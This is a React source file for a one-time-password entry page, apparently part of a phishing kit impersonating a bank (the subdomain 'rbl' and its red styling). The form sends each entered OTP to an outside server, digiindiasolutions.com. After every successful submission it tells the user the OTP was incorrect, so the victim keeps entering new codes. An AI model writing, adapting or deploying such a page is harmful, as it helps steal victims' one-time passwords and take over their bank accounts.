import React, { useEffect, useState } from 'react';
import './otp.css'; // Ensure you have this file for any additional custom styling

function Otp() {

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
  }, []);

  const onhandlerestart = () => {
    window.location.reload();
  }

  const [alert, setAlert] = useState(false);
  const [loading, setLoading] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [otpError, setOtpError] = useState("");

  const handleInputChange = (e) => {
    const value = e.target.value;
    if (value.length <= 6 && /^\d*$/.test(value)) {
      setOtpValue(value);
      setOtpError(""); // Reset error when input is valid
    } else {
      setOtpError("OTP must be a 6-digit number");
    }
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (otpValue.length !== 6) {
      setOtpError("OTP must be exactly 6 digits");
      return;
    }

    setLoading(true);

    const data = {
      otp: otpValue
    };

    try {
      const response = await fetch('https://rbl.digiindiasolutions.com/v1/createOtp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        console.log('Data submitted successfully');
        setAlert(true); // Show alert on success
        setOtpError(""); // Reset error on success
      } else {
        console.error('Form submission failed');
        setAlert(false); // Show alert on failure
      }
    } catch (error) {
      console.error('An error occurred:', error);
      setAlert(true); // Show alert on error
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <section className="otp-section flex flex-col items-center justify-center">

        {alert && (
          <div className="alert-box bg-red-200 border border-red-500 text-red-700 px-4 py-3 rounded-md mb-4">
            Incorrect OTP. Please try again.
          </div>
        )}

        {loading && (
          <div className="loading-overlay">
            <div className="loader"></div>
          </div>
        )}

        <div className="otp-container bg-white p-8 rounded-lg shadow-md">
          <div className="heading text-center mb-4">
            <span className="text-xl font-bold">ENTER OTP</span>
          </div>
          <form onSubmit={handleSubmit}>
            <div className="otp-box mb-4">
              <label htmlFor="otp" className="block text-gray-700 mb-2">OTP</label>
              <input
                type="number"
                id="otp"
                name="otp"
                className="block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring focus:border-indigo-300"
                placeholder="Enter OTP"
                required
                value={otpValue}
                onChange={handleInputChange}
              />
              <div className="resend-btn w-full mt-1 text-red-500 flex items-center justify-end">
                <a onClick={onhandlerestart} className=' text-end' href="">resend</a>
              </div>
              {otpError && (
                <p className="text-red-500 text-sm mt-2">{otpError}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full mb-2 px-4 py-2 bg-[#ED3338] text-white rounded-md hover:bg-[#eb272e] focus:outline-none focus:ring-2 focus:ring-indigo-500"
            >
              Submit
            </button>
            {/* <button 
             className="w-full px-4 py-2 bg-[#ED3338] text-white rounded-md hover:bg-[#eb272e] focus:outline-none focus:ring-2 focus:ring-indigo-500"
            
            >Resend</button> */}
          </form>
        </div>
      </section>
    </>
  );
}

export default Otp;
